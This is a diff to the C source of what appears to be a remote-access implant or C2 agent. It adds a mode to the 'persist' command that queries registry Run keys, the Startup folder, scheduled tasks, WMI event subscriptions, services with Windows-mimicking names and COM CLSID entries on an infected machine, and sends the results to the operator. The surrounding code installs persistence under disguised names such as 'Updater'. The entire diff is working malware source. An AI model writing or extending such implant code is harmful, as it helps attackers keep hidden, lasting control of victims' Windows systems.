@@ -2890,6 +2890,31 @@ void dispatch_task(AgentTask *task) {
         json_get_str(args,"name",name,sizeof(name),"Updater");
         json_get_str(args,"cmd",cmd2,sizeof(cmd2),"");
         json_get_str(args,"method",meth,sizeof(meth),"registry");
+        /* persist enum: scan all persistence mechanisms */
+        if (strcmp(meth,"enum")==0 || strcmp(meth,"check")==0 || strcmp(meth,"list")==0) {
+            char *result = NULL;
+            size_t rlen = 0, rcap = 0;
+#define PEAPPEND(s) do { size_t _n=strlen(s); if(rlen+_n+1>rcap){rcap=(rlen+_n+1)*2+2048; result=(char*)realloc(result,rcap);} if(result){memcpy(result+rlen,s,_n); rlen+=_n; result[rlen]='\0';} } while(0)
+            char *r; char tmp[256];
+            PEAPPEND("[*] Scanning persistence mechanisms...\n\n[HKCU Run]\n");
+            r=run_shell("reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" 2>&1"); if(r){PEAPPEND(r);PEAPPEND("\n");free(r);}
+            PEAPPEND("\n[HKLM Run]\n");
+            r=run_shell("reg query \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" 2>&1"); if(r){PEAPPEND(r);PEAPPEND("\n");free(r);}
+            PEAPPEND("\n[Startup folder]\n");
+            r=run_shell("cmd /c dir /B \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" 2>&1"); if(r){PEAPPEND(r);PEAPPEND("\n");free(r);}
+            PEAPPEND("\n[Scheduled tasks]\n");
+            r=run_shell("schtasks /query /fo TABLE /nh 2>&1"); if(r){PEAPPEND(r);PEAPPEND("\n");free(r);}
+            PEAPPEND("\n[WMI subscriptions]\n");
+            r=run_shell("wmic /NAMESPACE:\"\\\\root\\subscription\" PATH CommandLineEventConsumer get Name,ExecutablePath /format:list 2>&1"); if(r){PEAPPEND(r);PEAPPEND("\n");free(r);}
+            PEAPPEND("\n[Services (known names)]\n");
+            const char *svcs[]={"WindowsManagementService","Updater","MicrosoftUpdateService","WindowsUpdate",NULL};
+            for(int i=0;svcs[i];i++){snprintf(tmp,sizeof(tmp),"sc query \"%s\" 2>&1",svcs[i]); r=run_shell(tmp); if(r&&strstr(r,"STATE")){snprintf(tmp,sizeof(tmp),"  [FOUND] %s\n",svcs[i]); PEAPPEND(tmp);} free(r);}
+            PEAPPEND("\n[COM hijacking (HKCU\\\\Classes\\\\CLSID)]\n");
+            r=run_shell("reg query \"HKCU\\Software\\Classes\\CLSID\" 2>&1"); if(r){PEAPPEND(r);free(r);}
+#undef PEAPPEND
+            if(!result) result=_strdup("[!] persist enum: out of memory");
+            agent_send_result(task->id, result, ""); free(result); return;
+        }
         if (!cmd2[0]) { agent_send_result(task->id,"","PERSIST requires cmd"); return; }
         char shell_cmd[1024]={0};
         if (strcmp(meth,"schtask")==0)
